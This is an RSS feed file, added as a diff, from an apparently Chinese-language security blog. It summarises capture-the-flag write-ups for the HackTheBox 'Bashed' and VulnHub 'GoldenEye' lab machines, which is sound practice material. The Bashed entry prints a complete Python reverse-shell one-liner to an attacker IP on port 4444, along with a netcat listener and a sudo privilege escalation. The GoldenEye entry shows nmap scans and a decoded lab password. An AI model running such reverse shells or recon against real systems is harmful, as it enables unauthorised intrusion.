@@ -1,0 +1,43 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>2023-04 on xf3n9 secwalk</title>
+    <link>https://xf3n9.github.io/categories/2023-04/</link>
+    <description>Recent content in 2023-04 on xf3n9 secwalk</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sun, 02 Apr 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://xf3n9.github.io/categories/2023-04/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Bashed</title>
+      <link>https://xf3n9.github.io/docs/hackthebox/bashed/</link>
+      <pubDate>Sun, 02 Apr 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://xf3n9.github.io/docs/hackthebox/bashed/</guid>
+      <description>HTB: Bashed#Recon#http://10.10.10.68 有一篇关于phpbash的文章
+gobuster -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt /dev页面：
+点击phpbash.php给出一个页面shell，即phpbash
+Phpbash#尝试进入/home目录下的用户目录，成功找到user.txt
+Shell Upgrade#在phpbash中准备：
+python -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.14.157&amp;#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39; 在kali中监听：
+nc -nvlp 4444# connect to local from remotepython -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;# pty shell PrivEsc#sudo -lUser www-data may run the following commands on bashed:(scriptmanager : scriptmanager) NOPASSWD: ALL# switch user to scriptmanagersudo -u scriptmanager /bin/bashls -l /scripts# autorun py gen txttest.</description>
+    </item>
+    
+    <item>
+      <title>Brainfuck</title>
+      <link>https://xf3n9.github.io/docs/hackthebox/brainfuck/</link>
+      <pubDate>Sun, 02 Apr 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://xf3n9.github.io/docs/hackthebox/brainfuck/</guid>
+      <description>HTB: Brainfuck#</description>
+    </item>
+    
+    <item>
+      <title>Golden-Eye</title>
+      <link>https://xf3n9.github.io/docs/vulnhub/golden-eye/</link>
+      <pubDate>Sun, 02 Apr 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://xf3n9.github.io/docs/vulnhub/golden-eye/</guid>
+      <description>Vulnhub: GoldenEye#Recon#nmap## 主机存活扫描：nmap -sn 10.10.8.0/24# 全端口扫描：nmap --min-rate 10000 -Pn -p- 10.10.8.152PORT STATE SERVICE25/tcp open smtp80/tcp open http55006/tcp open unknown55007/tcp open unknown# 端口服务扫描：nmap -A -sV -T5 10.10.8.152 Web 80#1) 访问80端口，提示Naviagate to /sev-home/ to login// 新标签页打开 http://10.10.8.152/sev-home 2) F12开发者工具，看到terminal.js文件，点击查看 // 获得两个用户名：Boris Natalya// 一个encoded p@ssword：&amp;amp;#73;&amp;amp;#110;&amp;amp;#118;&amp;amp;#105;&amp;amp;#110;&amp;amp;#99;&amp;amp;#105;&amp;amp;#98;&amp;amp;#108;&amp;amp;#101;&amp;amp;#72;&amp;amp;#97;&amp;amp;#99;&amp;amp;#107;&amp;amp;#51;&amp;amp;#114;3) URL encode解码工具：// Burpsuite--Decoder--Decode as HTML获得密码：InvincibleHack3r Login</description>
+    </item>
+    
+  </channel>
+</rss>
